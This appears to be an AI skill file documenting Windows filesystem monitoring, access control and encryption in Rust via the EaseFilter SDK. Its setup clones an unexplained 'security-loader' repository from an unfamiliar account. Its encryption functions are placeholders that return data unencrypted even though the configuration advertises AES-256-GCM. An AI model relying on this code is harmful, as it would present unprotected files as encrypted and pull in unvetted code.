---
name: experimentersoftroll422-windows-filesystem-security
description: Windows filesystem security monitoring, access control, and encryption workflows using EaseFilter SDK with Rust bindings
triggers:
  - "monitor file activity on Windows"
  - "enforce filesystem access policies"
  - "implement file encryption workflows"
  - "use EaseFilter SDK with Rust"
  - "set up Windows file security monitoring"
  - "control file access permissions programmatically"
  - "integrate filesystem security in Rust"
  - "configure Windows filesystem observer"
---

# Experimentersoftroll422 Windows Filesystem Security

> Skill by [ara.so](https://ara.so) — Security Skills collection.

Experimentersoftroll422 is a Windows-focused filesystem security project that provides file activity monitoring, policy-based access control, and encryption workflow support through Rust bindings to the EaseFilter File Security SDK. It enables developers to build security-conscious file management solutions with real-time filesystem observation and enforcement capabilities.

## What It Does

- **File Activity Monitoring**: Captures filesystem events (open, read, write, delete, rename)
- **Access Control Enforcement**: Applies policy-based rules to allow/deny file operations
- **Encryption Workflow Support**: Integrates encryption processes into file access paths
- **Windows-Native Integration**: Leverages Windows kernel-level filesystem filtering
- **Rust Bindings**: Provides type-safe Rust interfaces to the EaseFilter SDK

## Installation

### Prerequisites

- Windows 10/11 or Windows Server 2016+
- Rust toolchain (1.70+)
- EaseFilter File Security SDK
- Administrator privileges for driver installation

### Clone and Setup

```bash
git clone https://github.com/tomw286/experimentersoftroll422-security-loader.git
cd experimentersoftroll422-security-loader
```

### Rust Project Structure

```toml
# Cargo.toml
[package]
name = "filesystem-security"
version = "2026.0.0"
edition = "2021"

[dependencies]
windows = { version = "0.51", features = ["Win32_Storage_FileSystem", "Win32_Security"] }
tokio = { version = "1.35", features = ["full"] }
serde = { version = "1.0", features = ["derive"] }
toml = "0.8"
```

## Configuration

### Security Policy Configuration

Create a `security_config.toml` file:

```toml
[filesystem]
monitor_files = true
control_access = true
encryption = true
log_level = "info"

[monitoring]
# Paths to monitor (supports wildcards)
watch_paths = [
    "C:\\SecureData\\**",
    "C:\\Users\\*\\Documents\\Confidential\\**"
]

# File operations to capture
capture_events = [
    "create",
    "open",
    "read",
    "write",
    "delete",
    "rename"
]

[access_control]
# Default policy: "allow" or "deny"
default_policy = "allow"

# Process whitelist (by executable path)
trusted_processes = [
    "C:\\Windows\\System32\\notepad.exe",
    "C:\\Program Files\\TrustedApp\\app.exe"
]

# File extension restrictions
blocked_extensions = [".tmp", ".bak"]

[encryption]
# Enable transparent encryption
enable_transparent = true
algorithm = "AES-256-GCM"
key_provider = "windows_dpapi"

# Encryption rules
auto_encrypt_paths = [
    "C:\\SecureData\\Encrypted\\**"
]

[integration]
runtime = "rust"
sdk = "EaseFilter File Security SDK"
driver_path = "C:\\Program Files\\EaseFilter\\FilterDriver.sys"

[performance]
# Buffer sizes and thread pools
event_buffer_size = 8192
worker_threads = 4
async_io = true
```

## Core API Usage

### Basic File Monitoring

```rust
use std::path::PathBuf;
use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize)]
pub struct SecurityConfig {
    pub filesystem: FilesystemConfig,
    pub monitoring: MonitoringConfig,
    pub access_control: AccessControlConfig,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct FilesystemConfig {
    pub monitor_files: bool,
    pub control_access: bool,
    pub encryption: bool,
    pub log_level: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct MonitoringConfig {
    pub watch_paths: Vec<String>,
    pub capture_events: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct AccessControlConfig {
    pub default_policy: String,
    pub trusted_processes: Vec<String>,
    pub blocked_extensions: Vec<String>,
}

// Load configuration
pub fn load_config(path: &str) -> Result<SecurityConfig, Box<dyn std::error::Error>> {
    let config_str = std::fs::read_to_string(path)?;
    let config: SecurityConfig = toml::from_str(&config_str)?;
    Ok(config)
}
```

### Initialize File System Monitor

```rust
use std::sync::{Arc, Mutex};
use std::collections::HashMap;

#[derive(Debug, Clone)]
pub enum FileEvent {
    Created { path: PathBuf, process: String },
    Opened { path: PathBuf, mode: AccessMode, process: String },
    Modified { path: PathBuf, process: String },
    Deleted { path: PathBuf, process: String },
    Renamed { old_path: PathBuf, new_path: PathBuf, process: String },
}

#[derive(Debug, Clone)]
pub enum AccessMode {
    Read,
    Write,
    ReadWrite,
}

pub struct FilesystemMonitor {
    config: SecurityConfig,
    event_handlers: Arc<Mutex<Vec<Box<dyn Fn(FileEvent) + Send + 'static>>>>,
}

impl FilesystemMonitor {
    pub fn new(config: SecurityConfig) -> Self {
        Self {
            config,
            event_handlers: Arc::new(Mutex::new(Vec::new())),
        }
    }

    pub fn register_handler<F>(&mut self, handler: F)
    where
        F: Fn(FileEvent) + Send + 'static,
    {
        self.event_handlers.lock().unwrap().push(Box::new(handler));
    }

    pub async fn start(&self) -> Result<(), Box<dyn std::error::Error>> {
        println!("Starting filesystem monitor...");
        
        // Initialize EaseFilter SDK connection
        self.init_easefilter_driver()?;
        
        // Register monitored paths
        for path in &self.config.monitoring.watch_paths {
            self.add_monitor_path(path)?;
        }

        println!("Monitor started successfully");
        Ok(())
    }

    fn init_easefilter_driver(&self) -> Result<(), Box<dyn std::error::Error>> {
        // SDK initialization logic
        // This would call into the actual EaseFilter SDK bindings
        println!("Initializing EaseFilter driver...");
        Ok(())
    }

    fn add_monitor_path(&self, path: &str) -> Result<(), Box<dyn std::error::Error>> {
        println!("Monitoring path: {}", path);
        Ok(())
    }

    pub fn emit_event(&self, event: FileEvent) {
        let handlers = self.event_handlers.lock().unwrap();
        for handler in handlers.iter() {
            handler(event.clone());
        }
    }
}
```

### Access Control Policy Engine

```rust
use std::path::Path;

pub struct AccessControlEngine {
    config: AccessControlConfig,
    audit_log: Arc<Mutex<Vec<AccessAuditEntry>>>,
}

#[derive(Debug, Clone)]
pub struct AccessAuditEntry {
    pub timestamp: std::time::SystemTime,
    pub process: String,
    pub file_path: PathBuf,
    pub operation: String,
    pub decision: AccessDecision,
    pub reason: String,
}

#[derive(Debug, Clone, PartialEq)]
pub enum AccessDecision {
    Allow,
    Deny,
}

impl AccessControlEngine {
    pub fn new(config: AccessControlConfig) -> Self {
        Self {
            config,
            audit_log: Arc::new(Mutex::new(Vec::new())),
        }
    }

    pub fn evaluate_access(
        &self,
        process_path: &str,
        file_path: &Path,
        operation: &str,
    ) -> AccessDecision {
        // Check process whitelist
        if self.is_trusted_process(process_path) {
            self.log_access(process_path, file_path, operation, AccessDecision::Allow, "Trusted process");
            return AccessDecision::Allow;
        }

        // Check file extension blacklist
        if let Some(ext) = file_path.extension() {
            if self.config.blocked_extensions.contains(&format!(".{}", ext.to_string_lossy())) {
                self.log_access(process_path, file_path, operation, AccessDecision::Deny, "Blocked extension");
                return AccessDecision::Deny;
            }
        }

        // Apply default policy
        let decision = match self.config.default_policy.as_str() {
            "allow" => AccessDecision::Allow,
            _ => AccessDecision::Deny,
        };

        self.log_access(process_path, file_path, operation, decision.clone(), "Default policy");
        decision
    }

    fn is_trusted_process(&self, process_path: &str) -> bool {
        self.config.trusted_processes.iter().any(|p| p == process_path)
    }

    fn log_access(
        &self,
        process: &str,
        file_path: &Path,
        operation: &str,
        decision: AccessDecision,
        reason: &str,
    ) {
        let entry = AccessAuditEntry {
            timestamp: std::time::SystemTime::now(),
            process: process.to_string(),
            file_path: file_path.to_path_buf(),
            operation: operation.to_string(),
            decision,
            reason: reason.to_string(),
        };

        self.audit_log.lock().unwrap().push(entry);
    }

    pub fn get_audit_log(&self) -> Vec<AccessAuditEntry> {
        self.audit_log.lock().unwrap().clone()
    }
}
```

### Encryption Workflow Integration

```rust
use std::io::{Read, Write};

pub struct EncryptionManager {
    algorithm: String,
    key_provider: String,
}

impl EncryptionManager {
    pub fn new(algorithm: String, key_provider: String) -> Self {
        Self {
            algorithm,
            key_provider,
        }
    }

    pub fn should_encrypt(&self, path: &Path, auto_encrypt_paths: &[String]) -> bool {
        let path_str = path.to_string_lossy();
        auto_encrypt_paths.iter().any(|pattern| {
            // Simple wildcard matching
            if pattern.ends_with("**") {
                let prefix = pattern.trim_end_matches("**");
                path_str.starts_with(prefix)
            } else {
                &path_str == pattern
            }
        })
    }

    pub fn encrypt_file(&self, source: &Path, dest: &Path) -> Result<(), Box<dyn std::error::Error>> {
        println!("Encrypting: {} -> {}", source.display(), dest.display());
        
        // Read source file
        let mut file = std::fs::File::open(source)?;
        let mut contents = Vec::new();
        file.read_to_end(&mut contents)?;

        // Encrypt data (simplified - use actual crypto library)
        let encrypted = self.encrypt_data(&contents)?;

        // Write encrypted file
        let mut out_file = std::fs::File::create(dest)?;
        out_file.write_all(&encrypted)?;

        Ok(())
    }

    pub fn decrypt_file(&self, source: &Path, dest: &Path) -> Result<(), Box<dyn std::error::Error>> {
        println!("Decrypting: {} -> {}", source.display(), dest.display());
        
        let mut file = std::fs::File::open(source)?;
        let mut contents = Vec::new();
        file.read_to_end(&mut contents)?;

        let decrypted = self.decrypt_data(&contents)?;

        let mut out_file = std::fs::File::create(dest)?;
        out_file.write_all(&decrypted)?;

        Ok(())
    }

    fn encrypt_data(&self, data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        // Placeholder - integrate actual encryption library
        // Use env var for key: std::env::var("ENCRYPTION_KEY")?
        Ok(data.to_vec())
    }

    fn decrypt_data(&self, data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        // Placeholder - integrate actual decryption library
        Ok(data.to_vec())
    }
}
```

### Complete Example Application

```rust
use tokio;
use std::path::PathBuf;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Load configuration
    let config = load_config("security_config.toml")?;

    // Initialize components
    let mut monitor = FilesystemMonitor::new(config.clone());
    let access_control = Arc::new(AccessControlEngine::new(config.access_control.clone()));
    let encryption = Arc::new(EncryptionManager::new(
        "AES-256-GCM".to_string(),
        "windows_dpapi".to_string(),
    ));

    // Register event handler
    let ac_clone = access_control.clone();
    let enc_clone = encryption.clone();
    monitor.register_handler(move |event| {
        match event {
            FileEvent::Opened { path, mode, process } => {
                let decision = ac_clone.evaluate_access(&process, &path, "open");
                println!("Access decision for {}: {:?}", path.display(), decision);
            }
            FileEvent::Created { path, process } => {
                // Check if file should be auto-encrypted
                if enc_clone.should_encrypt(&path, &["C:\\SecureData\\Encrypted\\**"]) {
                    println!("Auto-encrypting: {}", path.display());
                }
            }
            FileEvent::Modified { path, process } => {
                println!("File modified: {} by {}", path.display(), process);
            }
            _ => {}
        }
    });

    // Start monitoring
    monitor.start().await?;

    // Keep running
    println!("Filesystem security monitor active. Press Ctrl+C to exit.");
    tokio::signal::ctrl_c().await?;

    // Print audit log on exit
    println!("\n=== Access Audit Log ===");
    for entry in access_control.get_audit_log() {
        println!("{:?} | {} | {} | {:?} | {}",
            entry.timestamp,
            entry.process,
            entry.file_path.display(),
            entry.decision,
            entry.reason
        );
    }

    Ok(())
}
```

## Common Patterns

### Pattern 1: Real-Time Threat Response

```rust
pub struct ThreatDetector {
    suspicious_patterns: Vec<String>,
}

impl ThreatDetector {
    pub fn analyze_event(&self, event: &FileEvent) -> Option<ThreatAlert> {
        match event {
            FileEvent::Created { path, process } => {
                // Detect ransomware-like behavior
                if path.extension().and_then(|e| e.to_str()) == Some("encrypted") {
                    return Some(ThreatAlert {
                        severity: Severity::High,
                        description: format!("Suspicious encryption activity by {}", process),
                        recommended_action: "Block process and quarantine file",
                    });
                }
            }
            FileEvent::Modified { path, .. } => {
                // Detect mass file modifications
                // Track modification rate and alert if threshold exceeded
            }
            _ => {}
        }
        None
    }
}

pub struct ThreatAlert {
    pub severity: Severity,
    pub description: String,
    pub recommended_action: &'static str,
}

pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}
```

### Pattern 2: Compliance Auditing

```rust
pub struct ComplianceAuditor {
    log_file: std::fs::File,
}

impl ComplianceAuditor {
    pub fn new(log_path: &str) -> Result<Self, std::io::Error> {
        let file = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(log_path)?;
        Ok(Self { log_file: file })
    }

    pub fn log_access(&mut self, entry: &AccessAuditEntry) -> Result<(), std::io::Error> {
        use std::io::Write;
        
        let log_line = format!(
            "{:?}|{}|{}|{}|{:?}|{}\n",
            entry.timestamp,
            entry.process,
            entry.file_path.display(),
            entry.operation,
            entry.decision,
            entry.reason
        );
        
        self.log_file.write_all(log_line.as_bytes())?;
        self.log_file.flush()?;
        Ok(())
    }
}
```

### Pattern 3: Temporary Access Grants

```rust
use std::time::{Duration, SystemTime};
use std::collections::HashMap;

pub struct TemporaryAccessManager {
    grants: Arc<Mutex<HashMap<String, TemporaryGrant>>>,
}

pub struct TemporaryGrant {
    pub process: String,
    pub file_path: PathBuf,
    pub expires_at: SystemTime,
}

impl TemporaryAccessManager {
    pub fn new() -> Self {
        Self {
            grants: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    pub fn grant_temporary_access(
        &self,
        process: &str,
        file_path: &Path,
        duration: Duration,
    ) {
        let grant = TemporaryGrant {
            process: process.to_string(),
            file_path: file_path.to_path_buf(),
            expires_at: SystemTime::now() + duration,
        };

        let key = format!("{}::{}", process, file_path.display());
        self.grants.lock().unwrap().insert(key, grant);
    }

    pub fn has_temporary_access(&self, process: &str, file_path: &Path) -> bool {
        let key = format!("{}::{}", process, file_path.display());
        let grants = self.grants.lock().unwrap();
        
        if let Some(grant) = grants.get(&key) {
            SystemTime::now() < grant.expires_at
        } else {
            false
        }
    }

    pub fn cleanup_expired(&self) {
        let now = SystemTime::now();
        self.grants.lock().unwrap().retain(|_, grant| now < grant.expires_at);
    }
}
```

## Troubleshooting

### Driver Not Loading

**Problem**: EaseFilter driver fails to load or initialize.

**Solutions**:
```rust
// Check driver status
pub fn check_driver_status() -> Result<(), Box<dyn std::error::Error>> {
    use std::process::Command;
    
    let output = Command::new("sc")
        .args(&["query", "EaseFilter"])
        .output()?;
    
    if !output.status.success() {
        eprintln!("Driver not installed or not running");
        eprintln!("Install with: sc create EaseFilter ...");
        return Err("Driver not available".into());
    }
    
    Ok(())
}
```

- Verify running as Administrator
- Check driver is properly signed
- Review Windows Event Logs for driver errors
- Ensure no conflicting filesystem filters

### Events Not Captured

**Problem**: File events are not being received.

**Solutions**:
```rust
// Enable verbose logging
pub fn enable_debug_logging() {
    std::env::set_var("RUST_LOG", "debug");
    env_logger::init();
}

// Verify path patterns
pub fn test_path_matching(path: &Path, patterns: &[String]) {
    for pattern in patterns {
        let matches = path.to_string_lossy().contains(pattern.trim_end_matches("**"));
        println!("Path {} matches pattern {}: {}", path.display(), pattern, matches);
    }
}
```

- Confirm monitor paths are correct and accessible
- Check Windows permissions for monitored directories
- Verify capture_events configuration includes desired operations
- Test with simple paths before using wildcards

### Performance Issues

**Problem**: High CPU usage or event processing lag.

**Solutions**:
```rust
// Implement event batching
pub struct EventBatcher {
    batch: Vec<FileEvent>,
    batch_size: usize,
}

impl EventBatcher {
    pub fn add_event(&mut self, event: FileEvent) {
        self.batch.push(event);
        
        if self.batch.len() >= self.batch_size {
            self.flush();
        }
    }

    pub fn flush(&mut self) {
        // Process batch
        for event in self.batch.drain(..) {
            // Handle event
        }
    }
}
```

- Reduce monitored paths to only necessary directories
- Increase `event_buffer_size` in configuration
- Filter events at SDK level before Rust processing
- Use async I/O for file operations
- Implement event sampling for high-frequency operations

### Access Denied Errors

**Problem**: Operations fail with access denied.

**Solutions**:
- Run application with Administrator privileges
- Check file/directory permissions
- Verify process is allowed by Windows security policy
- Ensure antivirus is not blocking operations
- Review EaseFilter driver access permissions

### Encryption Key Issues

**Problem**: Encryption/decryption failures.

**Solutions**:
```rust
// Validate key provider
pub fn validate_key_provider() -> Result<(), Box<dyn std::error::Error>> {
    let key = std::env::var("ENCRYPTION_KEY")
        .map_err(|_| "ENCRYPTION_KEY environment variable not set")?;
    
    if key.len() < 32 {
        return Err("Encryption key must be at least 32 bytes".into());
    }
    
    Ok(())
}
```

- Ensure `ENCRYPTION_KEY` environment variable is set
- Verify key length matches algorithm requirements
- Check Windows DPAPI accessibility
- Test encryption/decryption with simple files first

## Environment Variables

```bash
# Encryption key (required for encryption workflows)
ENCRYPTION_KEY=your-secure-key-here

# Logging level
RUST_LOG=info

# Configuration file path (optional)
SECURITY_CONFIG_PATH=C:\path\to\security_config.toml

# Driver path override (optional)
EASEFILTER_DRIVER_PATH=C:\CustomPath\FilterDriver.sys
```

## Additional Resources

- Configure monitoring paths using Windows path syntax with wildcards
- Use Windows Event Viewer to diagnose driver-level issues
- Test policies in a controlled environment before production deployment
- Review EaseFilter SDK documentation for advanced filter configurations
- Implement proper error handling for all filesystem operations
